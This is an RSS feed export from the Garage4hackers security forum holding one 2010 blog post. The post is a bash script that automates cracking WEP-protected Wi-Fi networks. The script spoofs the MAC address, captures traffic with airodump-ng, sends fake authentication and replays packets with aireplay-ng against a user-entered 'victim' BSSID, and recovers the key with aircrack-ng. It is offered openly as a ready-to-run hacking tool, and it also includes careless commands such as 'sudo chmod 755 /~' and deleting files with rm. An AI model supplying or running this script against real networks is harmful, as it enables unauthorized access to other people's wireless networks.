<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - Blog of AlphaCentauri by AlphaCentauri</title>
		<link>http://garage4hackers.com/blog.php?u=237</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:46:42 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - Blog of AlphaCentauri by AlphaCentauri</title>
			<link>http://garage4hackers.com/blog.php?u=237</link>
		</image>
		<item>
			<title>Automating WEP hack - Shell Script</title>
			<link>http://garage4hackers.com/entry.php?b=40</link>
			<pubDate>Sun, 07 Nov 2010 13:06:54 GMT</pubDate>
			<description>Hi Folks, 
 
Please find below a script written to automate wep hacking - 
 
Some Instructions : 
 
1.use first option to spoof your mac 
 
2.use...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi Folks,<br />
<br />
Please find below a script written to automate wep hacking -<br />
<br />
Some Instructions :<br />
<br />
1.use first option to spoof your mac<br />
<br />
2.use second option to check the number of APs in your surrounding and to choose your victim wep AP ( note its mac address &amp; channel ).<br />
<br />
3. third option to Hack<br />
<br />
4. fourth option to exit<br />
<br />
<br />
Please note : <br />
<br />
a.this script will automatically prompt and help download aircrack-ng &amp; xterm apps for your linux system<br />
<br />
b. this is tested with atheros cards with ath5k &amp; ath9k drivers.<br />
<br />
c. copy this code into a text editor and save it with a .sh extension in your home folder. Run sudo chmod +x &lt;scriptname.sh&gt; at prompt to make the script executable<br />
<br />
It would be great to have you members develop on this code and bring in more features.<br />
<br />
<br />
-----------------------------------------------------------------------------------------------------------------<br />
<br />
#!/bin/bash<br />
<br />
clear<br />
<br />
MAC=00:11:22:33:44:55<br />
<br />
INTERFACE=wlan0<br />
<br />
INTERFACE2=mon0<br />
<br />
FILE=wep<br />
<br />
choice=5<br />
<br />
echo &quot;Please choose your hack&quot;<br />
echo &quot;1. Start Mac spoof&quot;<br />
echo &quot;2. Start Dump&quot;<br />
echo &quot;3. Start Hack&quot;<br />
echo &quot;4. Exit&quot;<br />
echo -n &quot;Choose now! [1-4]&quot;<br />
<br />
<br />
while [ $choice -eq 5 ]; do<br />
read choice<br />
<br />
if [ $choice -eq 1 ] ; then<br />
<br />
 echo &quot;Spoofing mac&quot;<br />
<br />
 sudo airmon-ng stop $INTERFACE<br />
<br />
 sudo ifconfig $INTERFACE down<br />
<br />
 sudo apt-get install macchanger<br />
<br />
 sudo macchanger --mac $MAC $INTERFACE<br />
<br />
 sudo airmon-ng start $INTERFACE<br />
<br />
else<br />
<br />
 if [ $choice -eq 2 ] ; then<br />
<br />
  echo &quot;Starting Dump&quot;<br />
  sudo ifconfig wlan0 down<br />
  sudo iwconfig wlan0 mode monitor<br />
<br />
  sudo apt-get install xterm<br />
  sudo xterm -hold -e airodump-ng wlan0<br />
<br />
  sleep 25<br />
  exit 0<br />
 else<br />
<br />
  if [ $choice -eq 3 ] ; then<br />
   echo &quot;Running Hack&quot;<br />
   <br />
   sudo apt-get install aircrack-ng<br />
   sudo apt-get install xterm<br />
  <br />
   sudo chmod  755 /~<br />
   sudo rm wep*.*<br />
   sudo rm replay*.*<br />
   <br />
   <br />
   echo Enter the BSSID (MAC address of Victim):<br />
   read BSSID<br />
<br />
   echo Enter the CHANNEL:<br />
   read CH<br />
   clear<br />
<br />
   sleep 1<br />
<br />
   sudo ifconfig wlan0 down<br />
   sudo airmon-ng stop mon0<br />
   sudo airmon-ng stop mon1<br />
   sudo airmon-ng start wlan0<br />
   <br />
<br />
   xterm -e sudo airodump-ng -c $CH -w $FILE --bssid $BSSID $INTERFACE2 &amp;<br />
<br />
   sleep 10<br />
<br />
   sudo aireplay-ng -1 0 -a $BSSID $INTERFACE2<br />
<br />
   sleep 5<br />
<br />
   xterm -e sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $BSSID $INTERFACE2<br />
   sleep 3<br />
<br />
   xterm -hold -e sudo aircrack-ng -b $BSSID $FILE*.cap<br />
  else<br />
<br />
   if [ $choice -eq 4 ] ; then<br />
    echo &quot;Now Exiting&quot;<br />
     else<br />
      echo &quot;Please choose your hack&quot;<br />
      echo &quot;1. Start Mac spoof&quot;<br />
      echo &quot;2. Start Dump&quot;<br />
      echo &quot;3. Start Hack&quot;<br />
      echo &quot;4. Exit&quot;<br />
      echo -n &quot;Choose now! [1-3]&quot;<br />
      choice=5<br />
   fi<br />
  fi<br />
 fi<br />
fi<br />
done<br />
exit 0<br />
<br />
--------------------------------------------------------------------------------------------------------------------</blockquote>

]]></content:encoded>
			<dc:creator>AlphaCentauri</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=40</guid>
		</item>
	</channel>
</rss>
